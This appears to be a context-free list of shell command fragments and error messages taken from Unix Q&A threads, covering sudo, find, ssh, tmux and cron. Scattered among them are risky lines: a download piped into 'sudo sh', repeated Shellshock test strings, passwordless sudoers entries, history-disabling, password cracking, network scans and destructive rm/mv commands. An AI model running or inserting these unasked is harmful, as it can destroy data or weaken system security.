$(date +%Y-%m-%d)
... where date between '$lastmonth' and '$thismonth' ...
iwlist scan
Frequency:2.412 GHz
set completion-ignore-case On
set completion-…
while read
help .
.: . filename [arguments]
. .bashrc
. path/to/do_stuff.sh
chmod +x path/to/do_stuff.sh
DATETIME 2014.03.14 12:23:24
DATETIME 2014.03.
expr index
expr index "DATETIME 2014.03.14 12:23:24" '.[0-9][/&][0-9]'
missing ]
[ -e $FILE ]
Starting /bin/bash.exe
exit 0
#!/bin/bash -e
sleep 5
ssh remote-host command
Received message too long 168435779
protocol error: unexpected <newline>
execl: couldn't exec `/bin/sh'
execl: No such file or directory
mv /* /some-folder
ls -l /bin/sh
lrwxrwxrwx 1 root root 4 Jul 22  2013 /bin/sh -> bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 938832 Jul 18  2013 /bin/bash
steve:steve 775
grep -q
Meta-x compile
bash -c "echo $PATH"
Compile Command
Compile Command
Meta-x compile
source ~/.bashrc; cd ~/myCode/src; make
Meta-x compile
if [ -n "$BASH_ENV" ]; then . "$BASH_ENV"; fi
source script.sh
. script.sh
chmod a-x script.sh
ssh -i
ssh <user>@<host> <command>
adb -s $1 logcat -v time > $1.log &
wc -l
config.vm.provision :shell, :path =>'file.sh'
C:\Program Files\Git\bin\sh.exe
git status
C:\Program Files\Git\bin\
shift 2
./command --foo blah --bar asdf
crontab -e
sudo -u foo /dir/foo_user_script.sh
echo $var
word splitting
hash -d
hash -r
no such file or directory
echo $PATH
export PATH
su <username>
su - <username>
sudo open -a "TextEdit" .bash_profile
OS X
export https_proxy=<username>:<password>@<proxy>:<port>
cat >> file <<EOF
sudo su
sudo bash
sudo bash
git config --global core.editor sub_new_block
-o ConnectTimeout=$seconds
killall ssh
ip route
ip route
ip route
ip addr
ip link
chmod +x file.sh
pi ALL=(ALL) NOPASSWD: ALL
echo $PASSWORD | sudo -S <command>
sudo gedit
 gksu gedit
sleep 15
nohup gksu bash ...
sudo ./temp.sh "$1" "$2" "$3"
echo "test.sh done!"
"test.sh done!"
source $HOME/.zshrc
sudo -u minecraft crontab -e
@reboot screen /home/minecraft/mc1/rtoolkit.sh
sudo -u minecraft
sudo -u screen -r
set -o emacs
set -o vi
find . -type f -mtime +7 ! -iname '.*'
parent directory
date '+%m%d&y
Last login: ...
Wrong password
$<space> command
unset HISTFILE
PROMPT_COMMAND=history -a
adam@morpheus:~ tmp
chmod +x script.ex
C-u C-k
GNU sed version 4.2.1
scrot -s
mkdir -p
mkdir "-p"
mkdir "\-p"
mkdir \-p
mkdir ./-p
mv "$filename"
head -c29999
tail -c+100
touch -m -r {} -d '-1 hour'
-type f
man touch
echo "World"
echo "World"
echo "Hello"
set -o vi
source script.sh
. ./script.sh
chmod u-x script.sh
$( )
Started GET
Completed 200 OK
grep -B 123 -A 456 "FATAL" file.txt
sleep 10
stat /dev
awk -f subpar.awk 2 <lorem.txt
\d{4} = match 4 digits (year, eg. 2014)
(0[7-9]) = match 07 - 09
| = OR
(1[0-1]) = match 10 -11
$1 FS $2
Advanced Options --> Execute as Administrator
c:\CygWin\bin\python2.7.exe /usr/local/bin/sudoserver.py
mv /usr/local/bin/sudo /usr/local/bin/sudo.py
alias sudo='SUDO.sh'
python3 cygwin-sudo.py **yourcommand**
No such file or directory
runuser - aba -c 'echo JAVA_HOME'
su - aba
su --login ada
su -c "echo $JAVA_HOME" ada
C:\cygwin\bin\mintty.exe -e /bin/bash -l -c '%1'
find ~ -maxdepth 1 -size +1024c -type f -exec du -h {} \; | sort -nr | head -14 | awk '{print $2}' | xargs -l basename
sort -hr
pushd i/like/icecream
dirs -v
ulimit -c
ulimit -a
ulimit -f
ulimit -a
exit [lindex [wait] 3]
wait returned: 8606 exp6 0 0 CHILDKILLED SIGSEGV {segmentation violation}
exit 1
-regextype posix-awk
-type d
-regex ".*/(.*)/\1$"
-exec sh -c "mv {}/* {}/../"
rmdir {}
No such file or directory
tmux list-sessions
tmuxinator list
tmux list-sessions
tmuxinator list
tmux list-sessions | cut -d: -f1
tmuxinator list | tail -n +2 | gsed -e 's/\s\+/\n/g'
echo "$TMUX_SESSIONS\n$TMUXINATOR_SESSIONS" | sort | uniq
tmuxinator list
local -aU
tmux list-sessions
$(tmux list-sessions)
${(f)$(tmux list-sessions)}
${(@)${(f)$(tmux list-sessions)}/:*/}
(dotfiles goodbye hello)
print -l $SESSIONS
tmuxinator list
man zshexpn
curl -f/--fail
Exit codes
man curl
command1 || command2
alias deploy=sh ~/dir/ectory/deploy.sh
-bash: alias: /Users/foo/dir/ectory/deploy.sh: not found
du -skh ${DIR}
23M Example/
DIFF=`expr $NEW_SIZE - $SIZE`
[[ $DIFF -ge 100000000 ]]
while sleep
for DIR in $DIR
for DIR in /home/*
1,/REMOVE/ { commands }
tar -czf myproject.tar.gz myoriginalproject
ls -la
. and ..
export PS1="\033[1;33m\u@\h: \w>\033[0m"
ESC[33mcommit long-commit-number ESC[m
git log
egrep -v
egrep -v '(sonDir|daughterDir|nephew.file)'
man logrotate
help [[ if
cat << 'EOF'
{ grouping }
%root   ALL=(ALL) NOPASSWD: ALL
%my_new_group   ALL=(ALL) NOPASSWD: ALL
/sbin/start myapp-service /sbin/stop myapp-service
admin ALL=(ALL:ALL) NOPASSWD: /sbin/start myapp-service, /sbin/stop myapp-service
ps axuwfw
ps axuwfw | grep -v grep | grep -i screen
ps axuwfw | grep -v grep | grep -i tmux
man ps
ps -ef
ps axuwfw
grep foo
grep -v …
man grep
grep --help
ps axu | grep screen
pgrep -alf screen
grep -i screen
grep --help
| wc -l
no such file or directory
echo $MY_VAR
export MY_VAR='foo'
echo $MY_VAR
chmod +x banana
echo $PATH
type puppet
C:\Program Files (x86)\Puppet Labs\Puppet\bin\puppet.bat
while true
less filename
cat filename | less
./script <someinput
dosomething | ./script
[ $# -ge 1 -a -f "$1" ]
$# -ge 1
cat $input
cat -
sudo chmod +x yourfile
sudo yourcommand
sudo su
find ~ -exec xattr -d com.apple.quarantine {} 2> /dev/null \;
xattr -d com.apple.quarantine /Volumes/develpment/global_constants/node_modules/.bin/mocha
./myscript.sh input.txt output.txt
find [in a given directory] [files and folders whose name matches (*guess1* OR *guess2*) AND whose name matches (*.extension1 OR *.extension2)]
brew install findutils
open index.html
open map.html
open map.html
open index.html
sudo nano /etc/bash.bashrc
brew install bash-completion
brew uninstall bash-completion --force
bash >|
echo bla > foo
echo bla >| foo
man bash
ls *.{aux,log}
-maxdepth 1
type -f
! -name "*.*"
-exec mv -t ./tree/ {} \+
-loop 1
-r 0.1
rm main!(.tex|.pdf)
grep -vFf keepers
man deluser
gcloud auth login command
gcloud auth login
apt-get update
gcloud auth login
declare -x LINENO
apt-get install dnsutils
yum install bind-utils
aptitude reinstall bash
find "/Volumes/Products/Specific Product Directory/Work Instructions" -print
find "/Volumes/Products/*/Work Instructions" -print
command not found
command not found
perl -F, -lane 'if($.==1){@a=@F;next};for($i=0;$i<@F;$i++){if($F[$i]!=""){push @c,$F[$i];push @b,$i}}if(@a){foreach(@b){push @t,$a[$_]};print join(",",@t);undef @a}print join(",",@c);undef @c' file.csv
echo NAME_OF_FILE
ssh localhost tty
tty -s && shopt -q login_shell && [[ -r ~/.bashrc ]] && . ~/.bashrc
[ prlctl list --info ubuntu-vm
grep State == "State: running" ]
for i in ${!yr[@]}
hash -d
cd ~magic/deeper
vim ~magic/something
open -a "Safari" ...
php -S localhost:8000
open "http://localhost:8000/foo.html/?foo=bar"
chmod +x adb
picocom --baud 115200 --echo /dev/ttyUSB0
echo -e
CTRL a
CTRL |
CTRL a
CTRL tab
CTRL a
CTRL c
pushd "{}"
strace -s1024 -e $(pgrep dd)
php killstat.php
while read  do ... done
/usr/bin/php -f "$i";
HTTP OK HTTP/1.1 200 OK
while [ $COUNT -gt 0 ]; do
convert ...
du /usr
# du /usr | sort -nr
ls | more
wc -c
7z e -so image.7z |
perl foo.pl
7z e -so image.7z | python md5sum.py
mv "$sourceDIR/run$i.mat" "$destDIR"
set -e
/etc/init.d/my_service start/stop
{print $0}
cd ..proj
cd ../../../../
cd ..pr<tab>
cd -
source ~/.bashrc
pcd baz
pcd foo
sh ./build.sh
: command not found
:set ff=unix
abcx foo
$( )
open -a Brackets;tty.js
CentOS release 6.5 (Final)
$ echo *
$ echo .
bind -p
chmod +x $(ls -p | grep /)
chmod +x *
chmod -x *.*
man 1 chmod
info '(coreutils)Conditional Executability'
-mindepth 1
while IFS=
read -r -d ''
-d ''
if [ -d "$file" ]; then chmod 750 "$file";
[ -d "$file" ]
else chmod 640 "$file"; fi
chmod +X
grep -H string
shopt -s globstar
brew doctor
rm -rf
brew doctor
rvm -v
Warning! PATH is not properly set up, '/Users/fab/.rvm/gems/ruby-2.1.0/bin' is not at first place ...
rvm get stable --auto-dotfiles
brew doctor
ls -la
curl -s http://api.blah.com/install | sudo sh
brew install
screen -c screens
sudo node
sudo node
chmod 0755 /etc
I have no name!**@mybox:/home$
chmod 644 /etc/passwd
open -a "Google Chrome" --args --profile-directory=<your profile name>
open -n -a "Google Chrome" --args --profile-directory="<your profile>"
<your profile>
Profile nn
~/Library/Application Support/Google/Chrome/
open -n -a "Google Chrome" --args https://example.com --profile-directory="Profile 5"
find "${HOME}/Library/Application Support/Dock" -name "*-*.db" -maxdepth 1
ln -s
crontab -e
ls -al|grep -i something
-v RS="|"
printf $0 (NR%3?RS:"\n")
while read -a line
echo "${line[*]:0:$i}"
echo "${line[*]:$i}"
open -a safari "http://endic.naver.com/search.nhn?sLn=en
bash -c
export TERM=xterm-256color
editprojectfiles="edit /foo/bar/afile.txt"
us_0.0, us_-0.2, us_-0.4 ... us_-3.8
/* mmap has 6 arguments */
, 0x%X
shopt -s checkwinsize
sudo -s $SHELL
sudo -s
sudo bash
sudo -s
cut -bN-M
-iL <inputfilename>
-p <port ranges>
chkconfig --add do_something
curl -s -o /srv/2000raid/Test/image-$datum.jpg http://page.com/image.jpg
echo $tmpdir
/cygdrive/c/workdir (newco, LLC)
a\\\ b
a\ b
-p 21
uniq -f 1
strace -f -tt
sudo -v
while true; do sudo -n true; sleep 60; kill -0 "$$" || exit; done 2>/dev/null &
txtplay < named_pipe.fifo
echo "Hello World" > named_pipe.fifo
sudo -u www-data sh -c "cd /var/www/live/app && Console/cake emailReader"
cd /var/www/live/app && Console/cake emailReader
Cannot proceed: the cube has no data
if ...; then .. fi
if ! ...; then ... fi
source ~/.bashrc
expose_php = On
head -n1
git push
-mindepth 1
-maxdepth 1
java -jar spigot.jar
screen -S test -p 0 -X stuff 'java -jar spigot.jar^M'
(sleep 20&);java -jar spigot.jar
bash -c "sleep 20;  screen -S test -p 0 -X stuff 'java -jar spigot.jar^M' "
command not found
USERNAME= 'myname'
> /dev/null 2>&1
-bash: __git_ps1: command not found.
port upgrade outdated
-bash: __git_ps1: command not found.
-bash: /usr/local/bin/python: No such file or directory
hash -r
hash -r
hash -p commandname
eval ...
eval ...
(arg: N)
(arg: N)
bind -r
zsh: no matches found: 123*123
meta name="og:image"
yum install java7
chmod og+x
\bin\bash MyScript.sh
\bin\sh  MyScript.sh
chown u+x MyScript.sh
sh MyScript.sh
awk '\Modelname\ {print}' directory/of/the/file
grep YourFileNameHere -e "| Name |" | cut -d " "  -f 4
| Name |
mono myfoo
ssh -o ServerAliveInterval=2
-o ServerAliveCountMax=10
type killphp
ls ^two.file
ls ^two*
ls (^two).file
ls !(two).file
man zshexpn
ls -1 ^two.file
ls -1 *~two.file
/etc/profile for
cmd $blah
xterm -e "bash -c \"./script.sh; exec bash\"" &
man screen
ps -A
less -F
less -F
ls -l
ls -laF
man ls
net use F: "\\server\share name"
sudo !!
commandName !*
sudo !!
sudo !!
sudo !!
man bash
export PATH
ls -R metasploit-framework-master | grep .rb | cp * gems
ls -R
ls -R metasploit-framework-master | grep .rb
grep .rb | cp * gems
ls -R
grep .rb
cp {} gems
gcc -Wall program1.c -o program1.out
dig localhost
dscacheutil -q host -a name localhost
env cd /path/to/directory
ls -l
chmod 600
ls -l
ps -A
myscr -o -r
myscr -h
myscr -or
myscr -or -h
myscr -or
myscr -or -h
shift 1
case *)
-overrider I will process
./foobar.sh -o --help -s -r
*) break;;
cd /var
cd www
printf %q
rm -rf --
-not -executable
-type f
export PATH=/home/bharat/scratch/bin/:$PATH
bsub myscript
IFS=, sentences1=($sentences)
IFS=, read ...
IFS=, sentences1=($sentences)
for sentence in ${sentences2[@]}
for sentence in "${sentences2[@]}"
for i in $(seq 1 2)
seq 1 2
$( )
echo $i $sentence
echo $0
ln -s
ln -s //networkdrive/directory.65
mklink /D directory.65 \\networkdrive\directory.65
ln -s
gnome-terminal -e command
xterm -e command
konsole -e command
terminal -e command
gnome-terminal --window-with-profile=NAMEOFTHEPROFILE -e command
users | wc -w
grep -w
cat | grep
ssh destination
myscript.sh | cat myfile.txt
myscript.sh ; cat myfile.txt
myscript.sh {parameters}
... > myfile3.txt
cat <&0
ls *
ls: *: No such file or directory
shopt | grep glob
shopt -s nullglob
popd +N
popd -n
popd -n +0
popd +0
popd -n +0
popd -n
curl http://website -o $temp >/dev/null 2>&1
extglob shopt
-bash: /usr/local/bin/ipython: /usr/local/opt/python/bin/python2.7: bad interpreter: No such file or directory
export PATH=/Library/Frameworks/Python.framework/Versions/3.2/bin:$PATH
/bin/bash myscript.sh http://yourhost/yourimage.ext where_to_save
wget From_where/what.jpg -O destpath
tmux send-keys session1:0 "good command" C-m
tmux send-keys session1:0 "good command" C-m | rm / | tmux send-keys sessionUseerMayNotDoAnyThingIn:0 "some command" C-m
bash myscript.sh -ram 4096M -jar something.jar -dir /home/something
\[ \]
named pipe
; do
; done
echo $file | sed
rename 's/HAUPT_SIA_039[.]\(.*\)/HAUPT_SIA_039_2.\1/g' HAUPT_SIA*.IMA
PAGER=less psql
PAGER=more man more
PAGER='' man more
export PAGER=less
find . -perm 0775 -type f | xargs exec
find . -perm 0775 -type f -exec ./exec.sh {} \;
tar -czvf some_folder_here
tar -czvf some_output_file.tar some_folder_here
$SHELL -l
$SHELL -l
sed -n 1~2p
lsvirtualenv -b
man bash
open -e .bash_profile
./doublecrypt dec /tmp/test.encrypted
$D $2 ${ERR} | $D - ${ERR}
ell.mp4 -b:a 192K -vn BIO06.1-Anatomy-of-the-Cell.mp3
ls ../media/bio123/97*BIO*.mp4
history -w; tmux
alias tmuxhist='history -w; tmux'
sleep 25m
sleep 25m
sleep 25
[ -f "$fname" ]
[ -f ~/Scripts/logs/"$fname" ]
-type d
-type f
-type d
sudo ls /Users/Jamie/Downloads/
sudo ls /Users/Jamie/Downloads/*zip
No such file or directory
sudo ls /Users/Hamish/Downloads/*zip
No such file or directory
sudo ls /Users/Jamie/Downloads/*
sudo sh -c "ls /Users/Jamie/Downloads/*.mp3"
sudo kill -UPDATE_LOG pid
alias update_log='kill -UPDATE_LOG; grant update_log on observing_user
read -n1
./script.sh && exit
head -n 2 <&0
rpm -qa
find -type f -name 'things.txt' | xargs dirname | xargs rm -r
find -type f -name 'things.txt'
xargs dirname
xargs rm -r
-n 1
echo <> file_not_exists.txt
echo <> temp.txt
echo <> temp.txt
man bash
tee script3.log &
for i in $( ls *.jpg); do convert -resize 20% $i optimized_$i; done
echo <> file_not_exists.txt
echo <> temp.txt
echo $HELLO
man bash
kdialog --help
man zenity
$(date +"%F")
find $PWD -type d -ctime +10 -exec rm -rf {} +
ls -d */
$(date +"%F")
head -n-10
xargs rm -rf
head -n-10
ls -l ${IPECONFIG[APACHELOGFILE]}
first string
second string
screen -r
nohup script &
$( command )
tmux detach
lp -n num-copies -o Collate=True filename
ssh-keygen -t rsa
cat ~/.rsa/id_rsa.pub | ssh user@server 'cat >> ~/.ssh/authorized_keys'
ssh user@server
ssh server
-i ~/.ssh/id_rsa.pub
IndentityFile ~/.rsa/id_rsa.pub
alias mdelna="mongo --eval 'db.users.remove({group:{$ne:"admin"}})' collection"
SyntaxError: Unexpected token :
alias mdelna="mongo --eval 'db.users.remove({group:{
:"admin"}})' collection"
SyntaxError: Unexpected token :
alias mdelna="mongo --eval 'db.users.remove({group:{
ne:"admin"}})' collection"
ReferenceError: admin is not defined
alias mdelna="mongo --eval 'db.users.remove({group:{
}})' collection"
ReferenceError: admin is not defined
alias mdelna="mongo --eval 'db.users.remove({group:{
}})' collection"
ReferenceError: admin is not defined
alias mdelna="mongo --eval 'var admin="admin";db.users.remove({group:{
}})' collection"
tail -f file.log
cp {} ./
cp full_path_to_item ./
sed -n "s/<value>.*<\/value>/<value>file:\\\\<\/value>/g" "test.txt" > "test.txt.new"
system("ls /")
ls /
sh -c "ls /"
sh -c "ls -l"
sh ls-l.sh
fbgrab [options] filename
fbgrab /mount/flashdrive/screenshot0.png
ant -v
fc -e [edit-cmd]
fc -e -
sort -u
chown -R nobody:nogroup *
shopt -s dotglob
sleep 1
echo version 1.0.1
-F'[ .]'
/^echo version/
echo version
print $1,$2
find . -name data.sh
sort -h
echo $?
xxxxxxx filename
echo $A
echo B newline C
B C
man bash
man termios
man tty_ioctl
man console_ioctl
\ 
:set list
:set nolist
awk 'f==0 && /./ {f=NR} END{if(f==NR){exit 0}; exit 1 }'
&& echo "Found A Single Line"
first==0 && /./ {first=NR}
/./ {last=NR}
END{if(first==last){exit 0}; exit 1 }
if expression ...
$( ... )
vi not[tab][tab]
x vi not[enter]
pre% section
exec {STDOUTBACK}>&1
exec {STDOUTBACK}>&-
man bash
cd *
cd */ 1
cd */ 2
cd */ 3
grep -vf inputnames.txt tree.txt | wc -l
echo -n -e "\x00\x00\x0A\x00        1      012601234512345\x00" | nc -w1 -u localhost 3000
echo 'Running Script'
Running Script
echo -n -e "\x00\x00\x0A\x00        1      012601234'$x'12345\x00" | nc -w1 -u localhost 30000
echo 'echo -n -e "blah"'
M-x shell
built-in Linux command
cmd="find DIRNAME"
ps u$pidno
ssh user@host -t "bash --rcfile /tmp/matthewh/.bashrc"
su - apache
history -c && history -r
-t "bash --rcfile /tmp/matthewh/.bashrc"
history -r
which php
which drush
which bash
$ ./test.sh
do something boring...
sleep 10000
ls -lah /data/*
cat /data/file1.txt
cat /data/file1.txt
ps aux
-bash: “ssh: command not found
source ~/.bash_profile
vim ~/.ssh/config
ssh example
svn info
su -
sudo service asterisk status
[ ok ] Asterisk PBX is running.
asterisk -rvvv
-bash: asterisk: command not found
-bash: asterisk: command not found
echo $PATH
echo $PATH
hash -r
help hash
dpkg -i ...
shell /bin/bash
shell -/bin/bash
sed -i '/^[0-9]+/d' 2.txt
sed -i '/^\d+/d' 2.txt
'cd /home/user && ls'
cd /home/user && ls
cd /home/user && ls
cd /home/user
echo ...
( ... )
grep foo
echo $foo
echo "$foo"
$ pwgen -B -N 10000 15 > pw.txt
$ pwgen -B -N 10000 15
man pwgen
mv IMG_{001-022}.jpg subdir
. script1
help .
. script3 &
./script4 &
ssh -t
Warning: no access to tty (Bad file descriptor). Thus no job control in this shell.
-s /bin/bash
sudo vi
man vi
java -version
java -jar something.jar
sudo update-alternatives --config java
sudo update-alternatives --install /usr/bin/java java /path/to/jre7/java 100
sudo update-alternatives --config java
. /path/to/version.txt
export APPVER
Commit to change Manifest $APPVER
**pwd -P**
readlink -f
man info coreutils readlink
realpath .
realpath \my\long\path\file.ext
type pwd
man pwd
man bash
man <TheShellName>
man bash
teacup install Expect
. script
chmod u+x script
bash script
alt b
option b
shift option b
rm -rf dirname
export LANG=...
find $directory -type f -name "*.vm"
ls -l
ls -l
ls -ld $directory/*.vm
printf '\a'
tput bel
echo -e '\a'
#!/bin/sh -ex
set +x
set +x
set +x
+ echo 
> >(grep -v "^+ echo ") 2>&1
echo foobar >&2
echo >&2 foobar
echo "foobar >&2"
echo "+ rm -rf --no-preserve-root /" >&2
man bash
set -x
{ …; } 2> /dev/null
shopt -s expand_aliases
echo "Message"
/dev/null: Bad address
@echo 'message'
set +x
cat -
cat -
trap "${CMD}" DEBUG
set -x
which pngcrush
`/cygdrive/c/Windows/system32/pngcrush somefile.jpg newfile.jpg`
The system cannot find the path specified
awk '{if (NR > 1) print $1 }'
grep -f - /etc/passwd
grep "/bin/bash$"
lastlog -b 90
lastlog -t 90
(NR > 1)
sed 1d
cut -d':' -f 1
grep -v
"Command not found"
Unmatched '.
bash: -c: option requires an argument
date: Undefined variable.
$ssh user@comp echo abc<ENTER>
nbtscan  192.168.1.0-255
sudo arp-scan --interface=eth0 192.168.0.0/24
sudo arp-scan --interface=wlan0 192.168.0.0/24
nmap -sP xxx.xxx.xxx.xxx
yum list installed
yum list updates
(package, version)
bash: [: =: unary operator expected
ls --color
echo $LS_COLORS
man dir_colors
sudo vi ...
sudo kill
kill %1
sudo vi
fg 1
[1]+ Stopped    sudo vi filename
fg 1
sudo vi
tasklist /FI "IMAGENAME eq websocket.exe" /FO TABLE /NH
ps -ef | grep -i "websocket"
grep --color=auto -i websocket
grep -v grep
ps -ef | grep -i "websocket" | grep -v grep
bash -l | sed 's/^/   /'
bash -l 2>&1
height of top and bottom margins
width of left and right margins
man cp
shopt extglob
shopt -s extglob
linux single
<< EOF
cygstart /bin/bash pwd
cygstart /bin/bash -i pwd
echo "<content>" > /etc/postfix/master.cf
set -H
ls | grep "png" | awk 'BEGIN{FS="\."}{print $1".png " $1".jpg"}'|xargs mv
$if mode=vi
sh  ./check.sh
: command not found ls
vim check.sh
:set notx
read -t
exec 0<&-
<name of process running (vim, bash, ruby, etc)> - <parent directory/current directory>
\[ \]
IP_address  Hostname
grep "^1\.2\.3\.4[[:space:]]" db
grep "^1\.2\.3\.4 " db
grep -F "1.2.3.4 " db
grep -f src_ip db
keytool -importkeystore -deststorepass:file ${somefile}
update-alternatives -config java
ssh root@server 'date'
Cinnamon, GNOME 3, xfce
Zen Linux 1.0-rc1
Ubuntu 14.04
env x='() { :;}; echo vulnerable'
zsh -c 'echo hello'
ls -sf
Exited with code: <EXIT CODE HERE>
<EXIT CODE HERE>
bash -c
bash -c 'python /tmp/test.py > /tmp/all.out 2>&1'
/tmp/bash_patched/bin/bash 3.1.18(1)-release
env X="() { :;} ; echo busted" /tmp/bash_patched/bin/bash -c "echo stuff"
find /home/ -ipath "*/temp/some.file" -type f  -execdir cp {} another.file \;
sed: -e expression #2, char 8: extra characters after command.
date +%Y%m%d%H%M%S
tail -n <lines> <file> > <new_file>
mv new_file file
cat <pattern><hotkey>
wget -S
sudo apt-get update && sudo apt-get install bash
env x='() { :;}; echo vulnerable' bash -c 'echo hello'
env x='() { :;}; echo vulnerable' bash -c 'echo hello'
sudo /bin/bash
sudo apt-get install --reinstall bash
sudo dpkg --remove --force-remove-reinstreq bash
sudo apt-get install bash
man apt-get
man dpkg
rm /usr/local/bin/bash
make install
make uninstall
make uninstall
make uninstall
dialog --menu ...
qiime_script options
apt-get install command-not-found
find /scripts/
cd /var && ssh localhost.error
cd /var && ssh localhost.error
ssh-add ~/.ssh/github_rsa
ssh-agent /bin/bash
ssh-agent /bin/bash
prefix-1 prefix-2
prefix-1 prefix-2
su - root
git push web master
export PATH=$PATH:/usr/local/git/bin
ffmpeg -i input.mp4 -c copy -map 0 -segment_time 8 -f segment output%03d.mp4
ffmpeg_split.sh -s test_vid.mp4 -o video-part%03d.mp4 -c 00:00:08
ffmpeg segment
[[ $offset -lt $result ]]
f="${f// /_}"
mkdir -p "$__PATH$f"
environment variables
shell variables
man set
declare -x VAR=VAL
rm='rm -I'
rm- I
alias rm="rm -i"
while read
rename -n
find .
echo */*
find . > foo
find .
cat foo
find .
find . | tr -d '\n'
find .
a b c
* . / $
extglob on
hostcomplete off
login_shell on
set -o
set show-all-if-ambiguous on
shopt -u progcomp
set -x
if [ $? -ne 0 ]; then
yum update || exit 1
sh ./server.sh&
screen -r
columns="$(tput cols)"
printf "%*s\n" $[$COLS/2] "$text"
display_center "file.txt"
wc -m
rm -rf ...
man bash
fsck -f
cat list.txt
cat list.txt | xargs -I {} touch {}
cat list.txt | xargs -I {} touch {} | if [-z - ]; then echo "blank file"; fi;
cat list.txt | xargs -I {} touch {} | if [-z - ]; then echo "{} is a blank file"; fi;
time john -incremental -stdout | grep 'clientsWeakPassword' | if [ ! -z - ]; then exit 0;
while read
cphaprob -ia list | grep "[Ns][at][ma][et]e\?"
sh .profile
fisher install edc/bass
bass source <command>
mv myfile.m myfile2.m; mv myfile2.m myfile.m
crontab -e
set -x
myscript hello
PROMPT_COMMAND="history -a; $PROMPT_COMMAND"
chmod +x
for (i=NF;i>1;i--){printf $i"."
print $1
grep '<\jpn\>' || grep '<\por\>' file1.csv > file2.csv
grep '; jpn;\|; por;' /path/to/file1.csv > file2.csv
$2 ~ /jpn|por/
print $3
... file1.csv
-f interval
-v "img=$(cat ~/.config/openbox/conky/image)"
/image/{sub("xxxx", img)}
${image xxxx ....
ls -la .*z
man script
:%s/^/#> /
shopt -s globstar
shopt -s nullglob
cd ~/app-root/data
apropos fort
brew install gcc
ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
cp "$f" ~/temp/merged/$orig_f
nohup ./start -Dhttp.port=9000
nohup ./start -Dhttp.port=9001
nohup ./start -Dhttp.port=9002
nohup ./start -Dhttp.port=9003
@reboot /opt/myJavaApp9000/tryReboot
crontab -e
until [start -Dhttp.port=9000]; do
chmod +x tryReboot
nohup ./start -Dhttp.port=port_number &
until command; do … done
zip -d *.zip '*.html'
M-x global-font-lock-mode
M-x customize-face <RET> default <RET>
M-x eval-region
set -e
if errorlevel 1 exit 1
rm -rf !(current)
set +H
cd /somewhere
cd -P
grep -E
npm install -g uncss
uncss --help
od -fc foo.txt
; read -p "Finished. Press Return.
ls -latr *errorAll
cp *errorAll ~/Target/
cp: cannot create regular file /home/tarskin/errorAlls/calibrated_20130903_healthy#1-b_IgA_again_1401_C10.errorAll: Permission denied
sudo cp *errorAll ~/Target/
ls -ld .
drwxr-xr-x 2 root root 3342336 Oct 22 10:09 .
ls -ld ~/errorAlls/
drwxr-xr-x 2 root root 3342336 Oct 22 10:09 .
cp A/.* B
cp -r A/.* B
find A -type d
grep -E "\."
cp -r
find A/ -type f
-maxdepth 1 -name '.*'
-exec cp -p {} B/ \;
mv /home/user/Downloads/*Horror* /home/user/Downloads/transmission/completed/Series/AHS/
-0 foo/bar -0 */*
xs="$some foo/bar */* $(get_others)"
-0 foo/bar -0 a/b
-0 foo/bar   -0 a/b
-0 foo/bar */*
-0 foo/bar -0 '*/*'
ps -fu <your_username> | grep bash
kill <bash_pid>
tail -f <some_file>
coffee -c -w <some_coffeescript_folder>
diff -qr
/a/b/file01 != /b/c/file01
ps aux|grep j\[a\]va
rm -i
rm -I
gcloud compute --project
ls --color=auto
ssh user@host "ls --color=auto"
echo $TERM
ssh <host> -t "TERM=${TERM} <command>"
# busybox
[ ! -d $VARIABLE_TO_ADD_TO_PATH ]
_testPathAndUnset VAR1 VAR2 VAR3
$VAR1 $VAR2 $VAR3
for d in "$@"
[ -d "${!d}" ] || unset "$d"
unset "$d"
echo $JAVA_HOME
source install.sh
xargs grep 'addresses' > /tmp/addr some file'name
find | xargs
-name "*"
-type f
chmod a-x /etc/rc.local
-m 1
head -1
mktemp -u
mktemp -u
echo hello > $tmp
mktemp -u
echo hello > $tmp
mktemp --dry-run
/path/to/asciisum.sh "word"
-u 3
$ brew install reattach-to-user-namespace
$ vi ~/.bash_aliases
$ source ~/.bash_aliases
echo $TERM
numlockx on
ls -lh
ssh user@
myssh server
ssh -l user server
echo -n "$result" | od -ctx1
echo -n "$result" | od -ctx1
od -ctx1
[[ $result == 'YES' ]]
ps -a
-port 7000
-port auto -port-file test-port.txt
-master senp://:$(cat test-port.txt)
netstat -ntl
groupadd Group_name
chgrp Group_name file
chmod g+x executable_file
chmod g+r file
useradd -G Group_name username
Ctrl-X Ctrl-E
set sp
nohook hostname
option ...
request ...
brew install bash
chsh -s /usr/local/bin/bash
$SHELL --version
GNU bash, version 4.3.30(1)-release (x86_64-apple-darwin14.0.0)
echo $BASH_VERSION
declare -A foo
-bash: declare: -A: invalid option
echo $0
URL types
pk2cmd -?v
Defaults     secure_path="blah"
Defaults env_keep +="VARIABLE VARIABLE VARIABLE"
dropbox help
notify-send 'test'
sudo service this_script start
for i in $(seq 0 $days);
php update_cron.php $(...)
php update_cron.php
$(date "+%Y-%m-%d" --date="$start_date +$i days")
-pix_fmt yuv420p
-crf 23
ffmpeg.exe -framerate 30 -start_number …
tar -F
bar -ns --size ${SIZE}
mkfifo somefifo
screen -t $plugin &&
screen -c ~/my_custom_screenrc
$prog $BARNYARD_OPTS
docker start fa3ecc46bc72
/bin/sh -c 'chef-so..
docker exec -it fa3ecc46bc72 bash
command1 ; command2 && command 3
(command1;commmand2) && command3
(command1);(command2 && command3)
command1 && command2
python3 ./script.py --input ./*.txt --verbose 2>&1 | tee -a ./script.log
find . -iregex '.*._.*' -exec rm {} \;
find . -iregex '.*._.*' | xargs rm -rf
xargs rm -rf
rm -rf
sleep 600
CREATE DATABASE
\c sis_db
\i fileN.sql
\set ON_ERROR_STOP on
df -H
dh -H
ssh admin@server-1 dh -H
sudo apt-get install rainbowstream
#!/System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/bin/ruby -W0
#!/System/Library/Frameworks/Ruby.framework/Versions/Current/usr/bin/ruby -W0
brew update
git fetch
git pull
git diff
\[[ \u@\w ]\]
\[\e[0m\e[u\]$ 
c:\CygWin\bin\bash.exe -i
ssh host -t "PS1='"$PS1"'; exec bash"
AcceptEnv PS1
PermitUserEnvironment yes
export ABC=123; exec bash
\[\e]0;\u@\h: \w\a\]${debian_chroot:+($debian_chroot)}\u@\h:\w\$
exec bash
. ~/.profile
. ~/.bashrc
export PS1_ovrrde="$PS1"
exec bash
ssh host -t "export PS1_ovrrde=..."
java -version
export JAVA_HOME=/tools/java/java8 && which java
